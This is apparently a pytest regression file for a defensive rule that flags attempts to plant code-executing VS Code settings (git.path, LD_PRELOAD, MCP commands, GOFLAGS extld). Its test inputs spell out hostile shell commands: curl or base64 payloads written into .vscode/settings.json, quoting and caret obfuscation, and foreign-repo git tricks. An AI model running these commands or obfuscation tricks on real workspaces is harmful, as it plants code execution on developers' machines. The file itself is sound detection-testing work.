def test_qa3_goflags_toolexec_asks():
    assert _rule(_write(S, {"go.toolsEnvVars": {"GOFLAGS": "-toolexec=./t"}})) == (RULE, Action.ASK)


def test_qa3_devcontainer_stock_template():
    d = {"customizations": {"vscode": {"settings": {
        "python.defaultInterpreterPath": "/usr/local/bin/python",
        "python.linting.pylintPath": "/usr/local/py-utils/bin/pylint"}}}}
    assert _hit(_write(".devcontainer/devcontainer.json", d)) is None
    # outside a devcontainer, /usr/local/bin still asks (documented)
    assert _rule(_write(S, {"python.defaultInterpreterPath": "/usr/local/bin/python"}))[0] == RULE


# ---- QA round 4 regressions ----------------------------------------------------------
@pytest.mark.parametrize("settings", [
    {"emeraldwalk.runonsave": {"commands": [{"match": ".*", "cmd":
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -f .\\tool.ps1"}]}},
    {"runOnSave.commands": [{"command": "C:\\Program Files\\Git\\bin\\bash.exe -c ./tool"}]},
    {"latex-workshop.latex.tools": [{"command": "C:\\Program Files\\Git\\bin\\bash.exe -c ./tool"}]},
    {"mcp": {"servers": {"x": {"command": "C:\\Program Files\\nodejs\\node.exe .\\tool.js"}}}},
    {"mcp": {"servers": {"x": {"command": "C:/Program Files/nodejs/node.exe ./tool.js"}}}},
    {"mcp": {"servers": {"x": {"command": "node", "args": ["./tool.js"]}}}},
    {"git.path": "C:\\Windows\\System32\\cmd.exe/c.\\tool.bat"},
    {"go.toolsEnvVars": {"GOFLAGS": "-ldflags=-extld=./tool"}},
    {"go.toolsEnvVars": {"GOFLAGS": "-linkmode=external -extld=./tool"}},
])
def test_qa4_dangerous(settings):
    assert _rule(_write(S, settings)) == (RULE, Action.ASK)


def test_qa4_devcontainer_image_filter_not_for_env():
    d = {"customizations": {"vscode": {"settings": {
        "terminal.integrated.env.linux": {"LD_PRELOAD": "/usr/local/bin/x.so"}}}}}
    assert _rule(_write(".devcontainer/devcontainer.json", d)) == (RULE, Action.ASK)


@pytest.mark.parametrize("cmd", [
    "curl https://example.com/s.json > /tmp/s.json; mv /tmp/s.json .vscode/settings.json",
    "base64 -d payload.b64 > /tmp/s.json; cp /tmp/s.json .vscode/settings.json",
    "wget -qO- https://x.example > s.tmp\nmv s.tmp .vscode/settings.json",
    "curl https://x.example >/tmp/s.json && install -m644 /tmp/s.json .vscode/settings.json",
    "tar -xf x.tar -C /tmp/x && cp /tmp/x/settings.json .vscode/settings.json",
    "curl https://x.example | tee /dev/null .vscode/settings.json",
    "curl https://x.example >| .vscode/settings.json",
    'cu""rl https://x.example > .vscode/settings.json',
    "git checkout evil -- \\\n.vscode/settings.json",
])
def test_qa4_opaque_staged_and_obfuscated(cmd):
    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)


def test_qa4_git_show_head_restore_benign():
    assert _hit(_shell("git show HEAD:.vscode/settings.json > .vscode/settings.json")) is None


def test_qa4_perf_paths():
    import time
    for cmd in ("cat " + "<<a " * 65536 + " > .vscode/settings.json",
                "echo '" + "x" * (8 << 20) + "' > notes.txt",
                "echo '{\"s\": \"" + '\\"git.path\\": [1,' * 120000 + "\"}' > .vscode/settings.json"):
        t = time.monotonic()
        _hit(_shell(cmd))
        assert time.monotonic() - t < 3.0, cmd[:40]


@pytest.mark.parametrize("cmd", [
    "c\\url https://example.com/s.json > .vscode/settings.json",
    "curl https://example.com/s.json >.vscode/settings.json",
    "curl https://example.com/s.json>.vscode/settings.json",
])
def test_qa4_opaque_spacing_and_backslash(cmd):
    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)


# ---- QA round 5 regressions ----------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "git show HEAD:payload.json > .vscode/settings.json",
    "git show HEAD:payload.json | tee .vscode/settings.json",
    "git show HEAD:empty evil:.vscode/settings.json > .vscode/settings.json",
    "base64 -d p.b64 > /tmp/s; cp /tmp/s .vscode/settings.json 2>/dev/null",
    "base64 -d p.b64 > /tmp/s; cp /tmp/s .vscode/settings.json # x",
    "git show evil:.vscode/settings.json > /tmp/s; cp /tmp/s .vscode/settings.json 2>/dev/null",
    "base64 --decode p.b64 > /tmp/s && mv -v /tmp/s .vscode/settings.json >/dev/null",
    "base64 -d p.b64 | tee /tmp/s >/dev/null; cp /tmp/s .vscode/settings.json 2>&1",
])
def test_qa5_opaque(cmd):
    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)


def test_qa5_head_restore_same_file_still_benign():
    assert _hit(_shell("git show HEAD:.vscode/settings.json > .vscode/settings.json")) is None
    assert _hit(_shell("git show :.vscode/settings.json > ./.vscode/settings.json")) is None


def test_qa5_cd_large_heredoc():
    body = "\n".join(f'"k{i}": "v",' for i in range(2500))
    cmd = "cd .vscode && cat > settings.json <<'EOF'\n{\n" + body + '\n"git.path": "./tool"\n}\nEOF'
    assert len(cmd) > 20000
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)
    cmd = ("pushd .vscode; tee settings.json >/dev/null <<'EOF'\n{\n" + body
           + '\n"terminal.integrated.env.linux": {"LD_PRELOAD": "./x.so"}\n}\nEOF')
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


@pytest.mark.parametrize("name", ["my.srv", "io.github.foo/srv", "a.b"])
def test_qa5_mcp_dotted_server_names(name):
    assert _rule(_write(S, {"mcp": {"servers": {name: {"command": "./tool"}}}})) == (RULE, Action.ASK)
    assert _rule(_edit("/nx/.vscode/settings.json", "x",
                       '"mcp": {"servers": {"' + name + '": {"command": "./tool"}}}')) == (RULE, Action.ASK)


def test_qa5_large_key_dense_write_fast():
    import time
    for body in ('"a":' * (2 * 1024 * 1024 - 10), '"a" :' * (1600000), '"a":\n' * 1600000):
        t = time.monotonic()
        _hit(_write(S, body))
        assert time.monotonic() - t < 2.5


def test_qa5_jsonc_strip_semantics():
    from aegis.rules import _vsc_strip_jsonc
    assert json.loads(_vsc_strip_jsonc('{"u": "http://a//b", /* c */ "x": [1,2,], // t\n}')) \
        == {"u": "http://a//b", "x": [1, 2]}
    assert json.loads(_vsc_strip_jsonc('{"s": "a,]", "q": "\\" // x"}')) == {"s": "a,]", "q": '" // x'}


# ---- QA round 6 regressions ----------------------------------------------------------
def test_qa6_lone_cr_ends_line_comment():
    body = '{"editor.tabSize": 2 // fmt\r, "git.path": "./tool"}\n}'
    assert _rule(_write(S, body)) == (RULE, Action.ASK)
    body = ('{"x": 1 // c\r, "terminal.integrated.env.linux": {"LD_PRELOAD": "./x.so"}}\n}')
    assert _rule(_write("/root/.config/Code/User/settings.json", body)) == (RULE, Action.ASK)
    # ordinary CRLF JSONC stays fine
    assert _hit(_write(S, '{\r\n  // c\r\n  "editor.tabSize": 2,\r\n}\r\n')) is None


@pytest.mark.parametrize("body", [
    '"a//b",' * ((8 << 20) // 7), '"/",' * ((8 << 20) // 4), ',}' * ((8 << 20) // 2),
    '//\n' * ((8 << 20) // 3),
], ids=["slashes-in-strings", "slash-strings", "trailing-commas", "comments"])
def test_qa6_jsonc_dense_fast(body):
    import time
    t = time.monotonic()
    _hit(_write(S, body))
    assert time.monotonic() - t < 1.5


@pytest.mark.parametrize("cmd", [
    "git --no-pager show evil:.vscode/settings.json > .vscode/settings.json",
    "git -c core.pager=cat show evil:.vscode/settings.json > .vscode/settings.json",
])
def test_qa6_git_global_options(cmd):
    assert _rule(_shell(cmd)) == (RULE, Action.ASK)


def test_qa6_head_restore_from_subdir(tmp_path):
    (tmp_path / ".git").mkdir()
    sub = tmp_path / "sub"
    sub.mkdir()
    cmd = "git show HEAD:.vscode/settings.json > .vscode/settings.json"
    assert _hit(_shell(cmd, tmp_path)) is None
    assert _rule(_shell(cmd, sub)) == (RULE, Action.ASK)
    assert _hit(_shell("git show HEAD:./.vscode/settings.json > .vscode/settings.json", sub)) is None


# ---- QA round 7 regressions ----------------------------------------------------------
def test_qa7_git_option_run_not_exponential(tmp_path):
    import time
    (tmp_path / ".git").mkdir()
    t = time.monotonic()
    _hit(_shell("git " + "-c " * 60 + "x > .vscode/settings.json", tmp_path))
    _hit(_shell("git " + "-c " * 5000 + "x > .vscode/settings.json", tmp_path))
    assert time.monotonic() - t < 1.0


@pytest.mark.parametrize("cmd", [
    "git --git-dir=/tmp/e.git show HEAD:.vscode/settings.json > .vscode/settings.json",
    "git --work-tree=. --git-dir=/tmp/e.git show @:.vscode/settings.json | tee .vscode/settings.json",
    "git --git-dir=/tmp/e.git --work-tree=. checkout HEAD -- .vscode/settings.json",
    "git --git-dir=/tmp/e.git --work-tree=. restore .vscode/settings.json",
    "GIT_DIR=/tmp/e.git git checkout -- .vscode/settings.json",
    "cd sub && git show HEAD:.vscode/settings.json > .vscode/settings.json",
])
def test_qa7_foreign_repo_and_cd(cmd, tmp_path):
    (tmp_path / ".git").mkdir()
    assert _rule(_shell(cmd, tmp_path))[1] in (Action.ASK, Action.DENY)


@pytest.mark.parametrize("cmd", [
    "git --no-pager show HEAD:.vscode/settings.json > .vscode/settings.json",
    "git -c color.ui=never show HEAD:.vscode/settings.json > .vscode/settings.json",
    "git checkout -- .vscode/settings.json",
])
def test_qa7_restore_still_benign(cmd, tmp_path):
    (tmp_path / ".git").mkdir()
    assert _hit(_shell(cmd, tmp_path)) is None


# ---- QA round 8 regressions ----------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    """echo '{"git.path":"./tool"}' > .vs$""code/sett$""ings.json""",
    """echo '{"git.path":"./tool"}' | tee .vs$""code/settings.json""",
    """cd .vs$""code && echo '{"git.path":"./tool"}' > sett$""ings.json""",
    """echo '{"settings":{"git.path":"./t"}}' > x.code-work$""space""",
    """cmd //c 'echo {"git.path":"./tool"} > .vs^code\\set^tings.json'""",
], ids=["locale-quote", "tee", "cd", "workspace", "caret"])
def test_qa8_prefilter_matches_scan_surface(cmd):
    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)


@pytest.mark.parametrize("cmd", [
    "export GIT_DIR=/p/e.git; git show HEAD:.vscode/settings.json > .vscode/settings.json",
    "GIT_DIR=x; export GIT_DIR; git show HEAD:.vscode/settings.json > .vscode/settings.json",
    "export GIT_DIR=/p/e.git && git checkout HEAD -- .vscode/settings.json",
    "export GIT_INDEX_FILE=/tmp/i; git show :.vscode/settings.json > .vscode/settings.json",
    "git -c Core.attributesFile=/tmp/a show HEAD:.vscode/settings.json > .vscode/settings.json",
])
def test_qa8_foreign_env_anywhere(cmd, tmp_path):
    (tmp_path / ".git").mkdir()
    assert _rule(_shell(cmd, tmp_path))[1] in (Action.ASK, Action.DENY)


@pytest.mark.parametrize("cmd", [
    "git --work-tree=. --git-dir=.git show --stat HEAD -- .vscode/settings.json",
    "git --git-dir=../other/.git log --show-signature -- .vscode/settings.json",
    "git --git-dir=$HOME/.dotfiles --work-tree=$HOME show HEAD:.config/Code/User/settings.json",
])
def test_qa8_foreign_readonly_benign(cmd):
    assert _hit(_shell(cmd)) is None


def test_qa8_foreign_regex_perf():
    import time
    for cmd in ("git --git-dir " * 20000 + "> .vscode/settings.json",
                "GIT_DIR= git " * 20000 + "> .vscode/settings.json",
                "echo git --namespace " * 15000 + "> .vscode/settings.json"):
        t = time.monotonic()
        _hit(_shell(cmd))
        assert time.monotonic() - t < 1.5, cmd[:30]


# ---- QA round 9 regressions ----------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "git --git-dir /tmp/evil show HEAD:x > /tmp/s; mv /tmp/s .vscode/settings.json",
    "git --git-dir /tmp/evil show HEAD:x > /tmp/s && cp /tmp/s .vscode/settings.json",
    "git --git-dir /tmp/evil show HEAD:x | tee /tmp/s\nmv /tmp/s .vscode/settings.json",
    "git --namespace n show HEAD:x > /tmp/s; mv /tmp/s .vscode/settings.json",
    "git --git-dir /tmp/evil cat-file blob HEAD:x > /tmp/s; mv /tmp/s .vscode/settings.json",
    """echo '{"git.path":"./tool"}' > .vs\\\ncode/settings.json""",
], ids=["mv", "cp", "tee-nl", "namespace", "cat-file", "line-cont"])
def test_qa9_staged_foreign_and_linecont(cmd):
    assert _rule(_shell(cmd))[1] in (Action.ASK, Action.DENY)


def test_qa9_caret_copy_source(tmp_path):
    (tmp_path / ".vscode").mkdir()
    (tmp_path / "evil.json").write_text('{"git.path": "./x"}')
    assert _rule(_shell("cmd //c 'type evil.json > .vs^code\\\\set^tings.json'", tmp_path))[1] \
        in (Action.ASK, Action.DENY)


@pytest.mark.parametrize("cmd", [
    "GIT_DIR=.git git status; git restore .vscode/settings.json",
    "GIT_DIR=.git git status && git checkout -- .vscode/settings.json",
])
def test_qa9_prefix_assignment_not_exported(cmd):
    assert _hit(_shell(cmd)) is None


def test_qa9_tee_sink_perf():
    import time
    for c in ("GIT_DIR=x git show " + "tee " * 50000 + "; echo .vscode/settings.json",
              "git --git-dir=x show " + "tee " * 50000 + "; echo .vscode/settings.json"):
        t = time.monotonic()
        _hit(_shell(c))
        assert time.monotonic() - t < 1.5
